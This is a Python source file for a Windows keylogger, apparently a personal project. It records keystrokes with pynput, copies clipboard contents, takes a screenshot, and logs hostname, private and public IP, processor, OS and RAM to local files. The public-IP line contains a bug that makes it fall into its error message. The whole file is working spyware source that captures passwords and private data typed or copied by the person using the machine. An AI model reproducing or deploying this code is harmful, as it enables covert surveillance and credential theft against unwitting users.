import socket
import platform

import win32clipboard

from pynput.keyboard import Key, Listener

from requests import get

from multiprocessing import Process, freeze_support

from PIL import ImageGrab

import psutil

keysInfo = "KeyLogs.txt"
system_information =  "systeminfo.txt"
clipboard_information = "clipboardInfo.txt"
screenshot_information = "screenshot.png"

file_path = "F:\\Project Keylogger\\Python"
extend = "\\"

def computer_information():
    with open(file_path + extend + system_information, "a") as f:
        hostname = socket.gethostname()
        IP_address = socket.gethostbyname(hostname)

        try:
            public_ip = get("https://api.ipify.org").text
            f.write("Public IP Address: ", public_ip)

        except Exception:
            f.write("Couldn't get Public IP Address (most likely run out of queries or maximum queries).\n")

        f.write("Processor: " + (platform.processor()) + '\n')
        f.write("System: " + platform.system() + " " + platform.version() + '\n')
        f.write("Machine: " + platform.machine() + '\n')
        f.write("Hostname: " + hostname + '\n')
        f.write("Private IP Address: " + IP_address + '\n')

computer_information()

def get_ram_info():
    ram_info = psutil.virtual_memory()
    total_ram = round(ram_info.total / (1024 ** 3), 2)

    with open(file_path + extend + system_information, "a") as f:
        f.write(f"\n Total Physical RAM: {total_ram}GB \n")

get_ram_info()

def copy_clipboard():
    with open(file_path + extend + clipboard_information, "a") as f:
        try:
            win32clipboard.OpenClipboard()
            pasted_data = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()

            f.write("Clipboard Data: \n" + pasted_data)

        except:
            f.write("\nClipboard could not be copied\n")


copy_clipboard()

def screenshot():
    im = ImageGrab.grab()
    im.save(file_path + extend + screenshot_information)

screenshot()


count = 0
keys = []



def when_pressed(key):
    global count, keys, currentTime
    keys.append(key)
    count += 1
    print("{0} pressed".format(key))

    if count >= 8:
        count = 0
        write_in_text_file(keys)
        keys = []

def write_in_text_file(keys):
    with open(file_path + extend + keysInfo, "a") as f:
        for key in keys:
            k = str(key).replace("'", "")
            if k.find("space") > 0:
                f.write("\n")
            elif k.find("key") == -1:
                f.write(k)


def when_released(key):
    if key == Key.esc:
        return False


with Listener(on_press=when_pressed, on_release=when_released) as listener:
    listener.join()
